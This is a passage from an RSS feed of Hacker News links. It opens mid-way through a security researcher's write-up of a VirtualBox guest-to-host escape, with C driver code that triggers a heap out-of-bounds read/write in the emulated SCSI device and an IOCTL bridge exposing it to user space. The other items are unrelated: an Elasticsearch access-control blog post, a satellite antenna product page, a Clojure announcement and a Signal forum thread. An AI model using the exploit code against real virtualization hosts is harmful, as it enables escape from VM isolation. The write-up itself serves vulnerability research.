    <span>static</span> <span>const</span> <span>uint32_t</span> buffer_size <span>=</span> <span>1024</span>;

    <span>// reset the state machine</span>
    __outbyte(port<span>+</span><span>3</span>, <span>0</span>);

    <span>// initiate a write operation</span>
    __outbyte(port<span>+</span><span>0</span>, <span>0</span>); <span>// TargetDevice (0)</span>
    __outbyte(port<span>+</span><span>0</span>, <span>1</span>); <span>// direction (to device)</span>
    
    __outbyte(port<span>+</span><span>0</span>, ((buffer_size <span>&gt;&gt;</span> <span>12</span>) <span>&amp;</span> <span>0xf0</span>) <span>|</span> (<span>sizeof</span>(cdb) <span>&amp;</span> <span>0xf</span>)); <span>// buffer length hi &amp; cdb length</span>
    __outbyte(port<span>+</span><span>0</span>, buffer_size);                                        <span>// bugger length low</span>
    __outbyte(port<span>+</span><span>0</span>, buffer_size <span>&gt;&gt;</span> <span>8</span>);                                   <span>// buffer length mid</span>
    
    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>sizeof</span>(cdb); i<span>++</span>)
        __outbyte(port<span>+</span><span>0</span>, cdb[i]);


    <span>// move the buffer pointer to 8 byte after the buffer and the remaining bytes to -8</span>
    <span>char</span> buf[buffer_size];
    __inbytestring(port<span>+</span><span>1</span>, buf, buffer_size <span>-</span> <span>1</span>)    <span>// Read bufsize-1</span>
    __inbytestring(port<span>+</span><span>1</span>, buf, <span>9</span>)                  <span>// Read 9 more bytes</span>

    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>sizeof</span>(buf); i <span>+=</span> <span>4</span>)
        <span>*</span>((<span>uint32_t</span><span>*</span>)(<span>&amp;</span>buf[i])) <span>=</span> <span>0xdeadbeef</span>
    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>10000</span>; i<span>++</span>)
        __outbytestring(port<span>+</span><span>1</span>, buf, <span>sizeof</span>(buf))
}

</code></pre><p>The driver first has to initiate the <code>SCSI</code> state machine with a <code>bufsize</code>. Then we read <code>bufsize-1</code> bytes and then we read 9 bytes. We chose 9 instead of 2 byte in order to have the buffer pointer 8 byte aligned after the overflow. Finally, we overwrite the next 10000kb after our allocated <code>buffer+8</code> with <code>0xdeadbeef</code>.</p><p>After loading this driver in the win7 guest, this is what we get: <img src="https://secret.club/assets/sauercl0ud/VM-aborted.png" alt=""></p><p>As expected, the VM crashes because we corrupted the heap. Now we know that our OOB read/write works and since working with drivers was annoying, we decided to modify the driver one last time to expose the vulnerability to user-space. The driver was modified to accept this <code>Req</code> struct via an <code>IOCTL</code>:</p><pre><code><span>enum</span> operations {
    OPERATION_OUTBYTE <span>=</span> <span>0</span>,
    OPERATION_INBYTE <span>=</span> <span>1</span>,
    OPERATION_OUTSTR <span>=</span> <span>2</span>,
    OPERATION_INSTR <span>=</span> <span>3</span>,
};

<span>typedef</span> <span>struct</span> {
    <span>volatile</span> <span>unsigned</span> <span>int</span> port;
    <span>volatile</span> <span>unsigned</span> <span>int</span> operation;
    <span>volatile</span> <span>unsigned</span> <span>int</span> data_byte_out;
} Req;
</code></pre><p>This enables us to use the driver as a bridge to communicate with the <code>SCSI</code> device from any user-space program. This makes exploit prototyping a whole lot faster and has the added benefit of removing the need to touch Windows drivers ever again (well, for the rest of this exploit anyway :D).</p><p>The bug gives us a liner heap OOB read/write primitive. Our goal is to get from here to arbitrary code execution so let’s put this bug to use!</p><h2 id="leaking-vboxcdll-and-heap-addresses"> <a href="#leaking-vboxcdll-and-heap-addresses">Leaking <code>vboxc.dll</code> and heap addresses</a></h2><p>We’re able to dump heap data using our OOB read but we’re still far from code execution. This is a good point to start …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://secret.club/2021/01/14/vbox-escape.html">https://secret.club/2021/01/14/vbox-escape.html</a></em></p>]]>
            </description>
            <link>https://secret.club/2021/01/14/vbox-escape.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25795731</guid>
            <pubDate>Fri, 15 Jan 2021 20:13:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elasticsearch is dead, long live Open Distro for Elasticsearch]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 54 (<a href="https://news.ycombinator.com/item?id=25794987">thread link</a>) | @nathaliaariza
<br/>
January 15, 2021 | https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch | <a href="https://web.archive.org/web/*/https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>TLDR<strong>: </strong>The need for an open-source alternative to Elasticsearch has recently become more evident; platforms that bundle Open Distro for Elasticsearch are able to future-proof open-source support for free-text search and Elasticsearch. In this post, we describe how Hopsworks leverages the authentication and authorization support in Open Distro for Elasticsearch to make free text search a project-based multi-tenant service in Hopsworks. More concretely, Hopsworks now supports dynamic <a href="https://en.wikipedia.org/wiki/Role-based_access_control#:~:text=Role%2Dbased%20access%20control%20(RBAC)%20is%20a%20policy%2D,simple%20to%20perform%20user%20assignments.">role-based access control</a> (RBAC) to indexes in elasticsearch with no performance penalty by building on Open Distro for Elasticsearch (ODES).<br></p><p>In January 2021, <a href="https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks">Elastic switched from the Apache V2 open-source license</a> for both Elasticsearch and Kibana to a non open-source license to Server Side Public License (SSPL).</p><p>Hopsworks is an open-source platform that includes Open Distro for Elasticsearch (a fork of Elasticsearch) and Kibana.</p><p>In Hopsworks, we use Elasticsearch to provide free-text search for AI assets (features, models, experiments, datasets, etc). We also make Elasticsearch indexes available for use by programs run in Hopsworks. As we interpret it, the latter functionality means we contravene the licensing terms of the SSPL:</p><blockquote>“If you make the functionality of the Program or a modified version available to third parties as a service... (license conditions apply)”</blockquote><p>‍</p><p>Luckily, we recently made the switch from Elasticsearch to <a href="https://opendistro.github.io/for-elasticsearch/">Open Distro for Elasticsearch</a>, supported by AWS, which is Apache v2 licensed.<br></p><p>Open Distro for Elasticsearch supports Active Directory and LDAP for authentication and authorization. <a href="https://opendistro.github.io/for-elasticsearch-docs/old/0.9.0/docs/security/permissions/">Using the Security plugin</a>, you can use RBAC to control the actions a user can perform. A role defines the cluster operations and index operations a user can perform, including access to indices, and even fine-grained field and document level access. RBAC allows an administrator to define a single security policy and apply it to all members of a department. But individuals may be members of multiple departments, so a user might be given multiple roles. <a href="https://link.springer.com/chapter/10.1007/978-3-540-85776-1_17">With dynamic role-based access control</a> you can change the set of roles a user can hold at a given time. </p><p>For example, if a user is a member of two departments - one for accessing banking data and another one for accessing trading data, with dynamic RBAC, you could restrict the user to only allow her to hold one of those roles at a given time. The policy for deciding which role the user holds could, for example, depend on what VPN (virtual private network) the user is logged in to or what building the user is present in. In effect, dynamic roles would allow the user to hold only one of the roles at a time and sandbox her inside one of the domains - banking or trading. It would prevent her from cross-linking or copying data between the different trading and banking domains.</p><p>Hopsworks implements a dynamic role-based access control model through its project-based multi-tenant security model<strong>. </strong>&nbsp;Every Project has an <strong>owner</strong> with full read-write privileges and zero or more <strong>members</strong>.&nbsp; A project owner may invite other users to his/her project as either a <strong>Data Scientist </strong>(read-only privileges and run jobs privileges) or <strong>Data Owner</strong> (full privileges). Users can be members of (or own) multiple Projects, but inside each project, each member (user) has a unique identity - we call it a <em>project-user identity</em>.&nbsp; For example, user <em>Alice</em> in <em>Project A</em> is different from user <em>Alice </em>in <em>Project B - </em>(in fact, the system-wide (project-user) identities are <strong><em>ProjectA__Alice</em></strong> and <strong><em>ProjectB__Alice</em></strong>, respectively)<em>. </em></p><p><em>‍</em>As such, each project-user identity is effectively a role with the project-level privileges to access data and run programs inside that project. If a user is a member of multiple projects, she has, in effect, multiple possible roles, but only one role can be active at a time when performing an action inside Hopsworks. When a user performs an action (for example, runs a program) it will be executed with the project-user identity. That is, the action will only have the privileges associated with that project. The figure below illustrates how Alice has a different identity for each of the two projects (A and B) that she is a member of. Each project contains its own separate private assets. Alice can use only one identity at a time which guarantees that she can’t access assets from both projects at the same time.</p><p>Hopsworks enables you to host sensitive data in a shared cluster using a <a href="https://www.logicalclocks.com/blog/how-we-secure-your-data-with-hopsworks">project-based access control security model</a> (an implementation of dynamic role-based access control). In Hopsworks, a project is a secure sandbox with members, data, code, and services. Similar to GitHub repositories, projects are self-service: users manage membership, roles, and can securely share data assets with other projects. This <em>project-based multi-tenant security model</em> enables users to host both sensitive and shared data in a single Hopsworks cluster - you do not need to manage and pay for separate clusters.&nbsp;<br></p><figure id="w-node-14452fea4591-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bafe67f9a01f3d5100b3_Screenshot%202021-01-15%20at%2016.54.57.png" loading="lazy" alt=""></p></figure><p>‍</p><p>An important aspect of project-based multi-tenancy is that assets can be shared between projects - sharing does not mean that data is duplicated. The current assets that can be shared between projects are: files/directories in HopsFS, Hive databases, feature stores, and Kafka topics. For example, in the figure below there are three users (User1, User2, and User3)&nbsp; and two projects (A and B). User1 is a member of project A, while User2 and User3 are members of project B. All three users (User1, User2, User3) can access the assets shared between project A and project B. As sharing does not mean copying, the access control rules for the asset are updated to give users in the other project read or write permissions on the shared asset.</p><p>‍<br></p><figure id="w-node-213ef0acf495-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bb182dbe7b79013d5093_Screenshot%202021-01-15%20at%2016.55.17.png" loading="lazy" alt=""></p></figure><p>‍</p><p>P<em>roject-user identity</em> is primarily based on a X.509 certificate issued internally by Hopsworks. Access control policies, however, are implemented by the platform services (HopsFS, Hive, Feature Store, Kafka), and for Elasticsearch Open Distro, permissions are managed using an open-source <a href="https://github.com/logicalclocks/elasticsearch-chef">Hopsworks project-based authorizer plugin</a>.</p><p>The following PySpark code snippet, <a href="https://github.com/logicalclocks/hops-examples/blob/master/notebooks/spark/Elasticsearch-python.ipynb">available as a notebook</a> when you run the Spark Tour on Hopsworks, shows how to read from an index that is private to a project from PySpark. There is also an <a href="https://github.com/logicalclocks/hops-examples/blob/master/notebooks/spark/Elasticsearch-scala.ipynb">equivalent Scala/Spark notebook</a>.</p><p>
    -- CODE language-bash --
from hops import elasticsearch, hdfs 
df = spark.read.option("header","true").csv("hdfs:///Projects/" + hdfs.project_name() + "/Resources/akc_breed_info.csv")

# Write df to the project's private index called 'newindex'
df.write.format('org.elasticsearch.spark.sql').options(**elasticsearch.get_elasticsearch_config("newindex")).mode("Overwrite").save()

# Read from the project's private index called 'newindex'
reader = spark.read.format("org.elasticsearch.spark.sql").options(**elasticsearch.get_elasticsearch_config("newindex"))
df = reader.load().orderBy("breed")
df.show()
</p><figure id="w-node-44c6e7d98db1-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bb89f179d5ce9d7be772_Screenshot%202021-01-15%20at%2016.57.47.png" loading="lazy" alt=""></p></figure><p>‍</p><p>In Hopsworks, we use Public Key Infrastructure (PKI) with X.509 certificates to authenticate and authorize users. Every user and every service in a Hopsworks cluster has a private key and an X.509 certificate. Hopsworks projects also support multi-tenant services that are not currently backed by X.509 certificates, including Elasticsearch. <a href="https://opendistro.github.io/for-elasticsearch/">Open Distro for Elasticsearch</a> supports authentication and access control using JSON Web Tokens (<a href="https://dzone.com/articles/what-is-jwt-token">JWT</a>).&nbsp; Similar to application X.509 certificates, Hopsworks’ resource manager (HopsYARN) issues a JWT for each submitted job and propagates it to running containers. Using the JWT, user code can then securely make calls to Elasticsearch indexes owned by the project. The JWT is rotated automatically before it expires and invalidated by HopsYARN once the application has finished.<br></p><p>For every Hopsworks project, a number of private indexes can be created in Elasticsearch: an index for real-time logs of applications in that project (accessible via Kibana), an index for ML experiments in the project, and an index for provenance for the project’s applications and file operations. Elastic indexes are private to the project - they are not accessible by users that are not members of the project. This access control is implemented as follows: when a request is made on Elasticsearch using a JWT token, our authorizer plugin extracts the project-specific username from the JWT token, which is of the form:<strong><em>‍</em></strong></p><p>‍<strong><em>ProjectA__Alice</em></strong>&nbsp;</p><p>The index names have the following form:</p><p><strong><em>ProjectA__ElasticIndex</em></strong>&nbsp;</p><p>Our plugin checks if a project-specific user is allowed to read/write an index by checking that the prefix (<strong>ProjectA</strong>) of both the user and the index match one another. We plan to add support for sharing elasticsearch indexes between projects by storing a list of projects allowed to perform read and write operations, respectively, on the indexes belonging to a project.</p><h2>X.509 Service certificates</h2><p>In Hopsworks, services communicate with each other using their own certificate to authenticate and encrypt all traffic. Each service in Hopsworks, that supports TLS encryption and/or authentication, has its own service-specific X.509 certificate, including all services in the ELK Stack (Elasticsearch, Kibana, and Logstash). Service certificates contain the Fully Qualified Domain Name (FQDN) of the host they are installed on and the login name of the system user that the process runs as. They are generated when a user provisions Hopsworks, and they have a long lifespan. Service certificates can be rotated automatically in configurable intervals or upon request of the administrator.&nbsp;</p><h2>Securely accessing Elastic Indexes in Jobs on Kubernetes&nbsp;<br></h2><figure id="w-node-d2ae8e066750-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bc186b327c00f6b51384_Screenshot%202021-01-15%20at%2016.59.47.png" loading="lazy" alt=""></p></figure><p>Hopsworks can be integrated with Kubernetes by configuring it to use one of the available authentication mechanisms: API tokens, credentials, certificates, and IAM roles for AWS’ managed EKS offering. Hopsworks can run users’ jobs on Kubernetes that have project-specific security material,&nbsp; X.509 certificates and JWTs, materialized to the launched Pods so user code can securely access services in Hopsworks, such as Open Distro for …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch">https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch</a></em></p>]]>
            </description>
            <link>https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794987</guid>
            <pubDate>Fri, 15 Jan 2021 19:17:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Satran Satellite Tracking Antenna]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25794849">thread link</a>) | @zenbryo
<br/>
January 15, 2021 | https://www.danaco.se/satellite-tracker-antenna/ | <a href="https://web.archive.org/web/*/https://www.danaco.se/satellite-tracker-antenna/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-content">


			
				<article id="post-664" class="page">

				
					<div>
					<div id="et-boc">
			
		<div>
			<div>
		<div>
				
				
				
				
					 <!-- .et_pb_row --><div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2019/04/divider.png" alt="" title="" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2019/04/divider.png 1920w, https://www.danaco.se/wp-content/uploads/2019/04/divider-300x14.png 300w, https://www.danaco.se/wp-content/uploads/2019/04/divider-768x36.png 768w, https://www.danaco.se/wp-content/uploads/2019/04/divider-1024x48.png 1024w, https://www.danaco.se/wp-content/uploads/2019/04/divider-1080x51.png 1080w" sizes="(max-width: 1920px) 100vw, 1920px"></span>
			</p>
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row -->
				
				
			</div> <!-- .et_pb_section --><div>
				
				
				
				
					<div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/rendering.jpg" alt="" title="rendering" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2021/01/rendering.jpg 756w, https://www.danaco.se/wp-content/uploads/2021/01/rendering-480x507.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 756px, 100vw"></span>
			</p>
			</div> <!-- .et_pb_column --><div>
				
				
				<div>
				
				
				<p><h2>Automatic Antenna Rotator for Amateur Radio Satellites</h2></p>
			</div> <!-- .et_pb_text --><div>
				
				
				<div><p><strong>Kits will be available very soon</strong>, but if you have a 3D-printer you can buy only the electronics and print most parts yourself, since the hardware is open source.</p>
<p>The onboard microprocessor has wifi-capability and can be controlled automatically with an easy to use android app.</p>
<p>The rotator has a mount that allows for many different kinds of antennas, a small satellite dish or perhaps even a camera.</p>
<p>All in all, SATRAN might be the only Az-El rotator for less than 200USD on the market.</p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row --><div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2020/12/satellite-app.jpg" alt="" title="satellite-app" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2020/12/satellite-app.jpg 1280w, https://www.danaco.se/wp-content/uploads/2020/12/satellite-app-980x554.jpg 980w, https://www.danaco.se/wp-content/uploads/2020/12/satellite-app-480x272.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1280px, 100vw"></span>
			</p><div>
				
				
				<p><em>Screenshot of the first android prototype app, currently in development</em></p>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row -->
				
				
			</div> <!-- .et_pb_section --><div>
				
				
				
				
					<div>
				 <!-- .et_pb_column --><div>
				
				
				 <!-- .et_pb_text --><div>
				
				
				<div><p>Amateur radio is a great hobby for tech lovers and today there are a variety of satellites that even non-licensed hobbyists can listen to using cheap SDR equipment (Software Defined Radio). Some send simple telemetry-data and others even allow two-way communication.</p>
<p>Many “CubeSATs” are now also in orbit – small, privately funded satellites built by schools, universities and enthusiasts. Even the international space station regularly transmits images by radio, using what is called “Slow Scan TV”.</p>
<p><span><a href="https://www.amsat.org/" target="_blank" rel="noopener">Learn more at AMSAT.org</a></span></p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row -->
				
				
			</div> <!-- .et_pb_section --><div>
				
				
				
				
					<div>
				<div>
				
				
				<div>
				
				
				<p><h2><em>“Make Space Accessible to All”</em></h2></p>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row --><div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/render-inside-1.jpg" alt="" title="render-inside" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2021/01/render-inside-1.jpg 928w, https://www.danaco.se/wp-content/uploads/2021/01/render-inside-1-480x380.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 928px, 100vw"></span>
			</p>
			</div> <!-- .et_pb_column --><div>
				
				
				 <!-- .et_pb_text --><div>
				
				
				<div><p>The outer dimensions are only approx 18x15x15cm and houses both the Nema17 stepper motors and the controller board inside the black, splash-proof casing.</p>
<p>The hardware consists mainly of 3D-printed parts, CNC-cut plastic sides and a top cover in aluminium sheet metal.</p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row --><div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/render-bottom-1.jpg" alt="" title="render-bottom" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2021/01/render-bottom-1.jpg 928w, https://www.danaco.se/wp-content/uploads/2021/01/render-bottom-1-480x380.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 928px, 100vw"></span>
			</p><div>
				
				
				<p><h3>Cables run through center</h3></p>
			</div> <!-- .et_pb_text --><div>
				
				
				<div><p>The azimuth turntable has no center, allowing for power and RF cables to run through. Perfect for mounting it on top of a pipe.</p>
<p>Limit switches keep track of the turntables position, not to twist the cables too far. In the future I hope to offer slip rings (rotary cable joint) as an upgrade option, allowing endless rotation.</p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column --><div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/render-bottom-1.jpg" alt="" title="render-bottom" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2021/01/render-bottom-1.jpg 928w, https://www.danaco.se/wp-content/uploads/2021/01/render-bottom-1-480x380.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 928px, 100vw"></span>
			</p>
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row --><div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/render-wifi.jpg" alt="" title="render-wifi" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2021/01/render-wifi.jpg 928w, https://www.danaco.se/wp-content/uploads/2021/01/render-wifi-480x380.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 928px, 100vw"></span>
			</p>
			</div> <!-- .et_pb_column --><div>
				
				
				 <!-- .et_pb_text --><div>
				
				
				<div><p>Communication with the tracker runs over HTTP via your local WLAN-setup (b/g/n), no cables needed. It can even be controlled over the Internet if you want it to.</p>
<p>The smartphone app for android can be used to control the rotor, but interfacing with other positioning software might be possible in the future.</p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row --><div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/render-angles.gif" alt="" title="render-angles" height="auto" width="auto"></span>
			</p> <!-- .et_pb_text --><div>
				
				
				<p>The azimuth can turn a full 360 degrees, and the elevation approximately 100 degrees from zenith, covering the entire sky even when mounted high above the horizon.</p>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column --><div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/render-angles.gif" alt="" title="render-angles" height="auto" width="auto"></span>
			</p>
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row -->
				
				
			</div> <!-- .et_pb_section --> <!-- .et_pb_section --><div>
				
				
				
				
					<div>
				<div>
				
				
				<div>
				
				
				<div><h4><strong>Follow the project at Hackaday.io</strong></h4>
<p><em>The prototyping is featured on Hackaday where the development is being documented as a blog.</em></p>
<p><a href="https://hackaday.io/project/176381-satran-satellite-tracker-antenna" target="_blank" rel="noopener noreferrer">Visit Hackaday.io</a> »</p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column --><div>
				
				
				<div>
				
				
				<div><h4><strong>Feel free to donate</strong></h4>
<p>Development and prototyping is expensive and my resources are very limited. Donate and help make the project open source.</p>
<p><a href="https://www.paypal.com/donate?hosted_button_id=PX7XKDZMJ2WB2" target="_blank" rel="noopener">Donate with PayPal</a> »</p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row -->
				
				
			</div> <!-- .et_pb_section --><div>
				
				
				
				
					<div>
				<div>
				
				
				<div>
				
				
				<div><h2>I want to buy one!</h2>
<p>Leave your e-mail and get a reminder when kits are available for purchase</p></div>
			</div> <!-- .et_pb_text -->
			 <!-- .et_pb_contact_form_container -->
			
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row -->
				
				
			</div> <!-- .et_pb_section -->		</div><!-- .et_builder_inner_content -->
	</div><!-- .et-l -->
	
			
		</div><!-- #et-boc -->
							</div> <!-- .entry-content -->

				
				</article> <!-- .et_pb_post -->

			

</div></div>]]>
            </description>
            <link>https://www.danaco.se/satellite-tracker-antenna/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794849</guid>
            <pubDate>Fri, 15 Jan 2021 19:07:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clojure Core]]>
            </title>
            <description>
<![CDATA[
Score 158 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25794739">thread link</a>) | @tosh
<br/>
January 15, 2021 | http://blog.fogus.me/2021/01/15/clojure-core/ | <a href="https://web.archive.org/web/*/http://blog.fogus.me/2021/01/15/clojure-core/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="body">

                <div id="post-6729">
                 <h3><a href="http://blog.fogus.me/2021/01/15/clojure-core/" title="Clojure Core">Clojure Core</a></h3>
                 <p><span>Jan 15, 2021 </span></p><p>Earlier today Rich Hickey let the cat out of the bag that <a href="https://twitter.com/richhickey/status/1350110634776657920">I’m joining the Clojure Core</a> development team.</p>

<blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">We are excited to welcome <a href="https://twitter.com/fogus?ref_src=twsrc%5Etfw">@fogus</a>, long-time Clojure contributor and co-author of Joy of Clojure, to the Clojure core team!</p>— Rich Hickey (@richhickey) <a href="https://twitter.com/richhickey/status/1350110634776657920?ref_src=twsrc%5Etfw">January 15, 2021</a></blockquote>

<p>This is a change from my previous relationship with the Clojure Core team that in the past few years has been sporadic at best. This circumstance arose through necessity rather than desire and so I’m overjoyed to work closely with the team once again. Over the past few years <a href="https://twitter.com/puredanger">Alex Miller</a> has exerted a Herculean effort in shepherding the language through numerous versions and steady growth. I’m overjoyed to be given the opportunity to join him in helping push the language forward, and I’ll do my very best to avoid breaking everything.</p>

<p>So what this means is that I’ll be far more visible<sup id="fnref:v"><a href="#fn:v" rel="footnote">1</a></sup> in and around the Clojure ecosystem while spending my time thinking about Clojure more so than just using Clojure.<sup id="fnref:cljs"><a href="#fn:cljs" rel="footnote">2</a></sup></p>



            </div>
            <!-- end comments_wrapper -->            </div></div>]]>
            </description>
            <link>http://blog.fogus.me/2021/01/15/clojure-core/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794739</guid>
            <pubDate>Fri, 15 Jan 2021 19:00:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[68.3% of people in China use third-party keyboards – many of them use Signal]]>
            </title>
            <description>
<![CDATA[
Score 91 | Comments 65 (<a href="https://news.ycombinator.com/item?id=25793438">thread link</a>) | @resynth1943
<br/>
January 15, 2021 | https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272 | <a href="https://web.archive.org/web/*/https://community.signalusers.org/t/signal-should-warn-users-who-are-likely-using-insecure-ime-apps/10272">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-outlet">
        

  


      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T18:00:26Z">
                November 22, 2019,  6:00pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T18:00:26Z">
          <span itemprop="position">#1</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Inspired by this thread: <a href="https://twitter.com/RealSexyCyborg/status/1197695344575799296" rel="nofollow noopener">https://twitter.com/RealSexyCyborg/status/1197695344575799296</a></p>
<p>“68.3% of smartphones in China are using third-party IME apps.” (<a href="http://web.cse.ohio-state.edu/~lin.3021/file/SEC15.pdf" rel="nofollow noopener">http://web.cse.ohio-state.edu/~lin.3021/file/SEC15.pdf</a>)</p>
<p>Anecdotal evidence (from the above thread) warns that users unfamiliar with IME (or careless about its risks) are promoting Signal as “secure” without pointing out the dangers associated with third-party IME. This undercuts the purpose of the app for a large group of people, many of whom face far graver consequences for insecure communications than their English-speaking counterparts.</p>
<p>When Signal detects the user speaks a language likely to be accompanied by third-party IME, it should visibly warn the user of the risks.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">
          <meta itemprop="keywords" content="">

        

         

            
      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/dc7ia"><span itemprop="name">dc7ia</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2019-11-22T18:36:33Z">
                November 22, 2019,  6:36pm
              </time>
              <meta itemprop="dateModified" content="2019-11-22T18:36:33Z">
          <span itemprop="position">#2</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Welcome to the forum.</p>
<p>What does IME stand for?</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          

<p>I could not have summed it up better… While I understand the concern, I don’t see Signal being responsible for solving this threat vector.</p>

<p>When Signal would do that, the same people would go nuts, saying that this is a violation and Signal should not track that. This time I would agree.</p>
        </div>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://community.signalusers.org/u/PiCob"><span itemprop="name">PiCob</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2019-11-22T20:09:07Z">
              <time itemprop="dateModified" datetime="2019-11-22T20:09:19Z">
                November 22, 2019,  8:09pm
              </time>
          <span itemprop="position">#4</span>
          </span>
        </p></div>
        <p>input method editor (e.g. software keyboard)</p>

        <meta itemprop="headline" content="Signal should warn users who are likely using insecure IME apps">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          
<p>I too, have to agree that Signal should not police how you are using your device (nor should any other software, unless it is a specific tool designed for that purpose).</p>
        </div>

